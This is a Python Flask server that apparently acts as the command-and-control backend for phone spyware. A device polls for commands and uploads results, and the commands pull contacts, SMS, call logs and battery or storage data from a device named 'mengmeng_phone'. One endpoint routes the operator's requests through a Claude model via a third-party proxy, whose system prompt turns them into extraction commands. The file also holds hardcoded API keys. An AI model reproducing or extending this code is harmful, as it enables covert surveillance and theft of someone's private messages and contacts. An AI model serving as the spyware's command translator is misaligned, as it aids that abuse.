from flask import Flask, request, jsonify
import requests as req
import time

app = Flask(__name__)

API_KEY = "lz1102mm"
AI_API_KEY = "sk-kmA2rtd2OE4eoIcCX4kK0KRZ7Z0bIXTqbw45XWcm9Y6JNp5W"
AI_API_URL = "https://noir.blacknoir.cn/v1/chat/completions"

commands = {}
results = {}

def check_auth():
    key = request.headers.get("X-API-Key", "")
    return key == API_KEY

@app.route('/')
def index():
    return 'OK'

@app.route('/ai', methods=['POST'])
def ai_command():
    if not check_auth():
        return jsonify({'status': 'unauthorized'}), 401
    data = request.json
    user_msg = data.get('message', '')
    headers = {
        "Authorization": f"Bearer {AI_API_KEY}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": "claude-sonnet-4-20250514",
        "messages": [
            {"role": "system", "content": "You are a phone control assistant. When the user wants to check phone info, respond with exactly one of these commands: battery, storage, contacts, sms, calllog, all. Only respond with the command word, nothing else."},
            {"role": "user", "content": user_msg}
        ],
        "max_tokens": 50
    }
    try:
        r = req.post(AI_API_URL, json=payload, headers=headers, timeout=30)
        ai_response = r.json()
        cmd = ai_response["choices"][0]["message"]["content"].strip().lower()
        commands["mengmeng_phone"] = cmd
        return jsonify({'status': 'command_sent', 'command': cmd})
    except Exception as e:
        return jsonify({'status': 'error', 'detail': str(e)}), 500

@app.route('/send', methods=['POST'])
def send_command():
    if not check_auth():
        return jsonify({'status': 'unauthorized'}), 401
    data = request.json
    device_id = data.get('device_id', 'default')
    command = data.get('command', '')
    commands[device_id] = command
    return jsonify({'status': 'queued'})

@app.route('/poll', methods=['GET'])
def poll_command():
    device_id = request.args.get('device_id', 'default')
    if device_id in commands:
        cmd = commands.pop(device_id)
        return jsonify({'command': cmd})
    return jsonify({'command': None})

@app.route('/result', methods=['POST'])
def post_result():
    data = request.json
    device_id = data.get('device_id', 'default')
    result = data.get('result', '')
    results[device_id] = result
    return jsonify({'status': 'ok'})

@app.route('/getresult', methods=['GET'])
def get_result():
    if not check_auth():
        return jsonify({'status': 'unauthorized'}), 401
    device_id = request.args.get('device_id', 'default')
    if device_id in results:
        return jsonify({'result': results.pop(device_id)})
    return jsonify({'result': None})

if __name__ == '__main__':
    app.run()
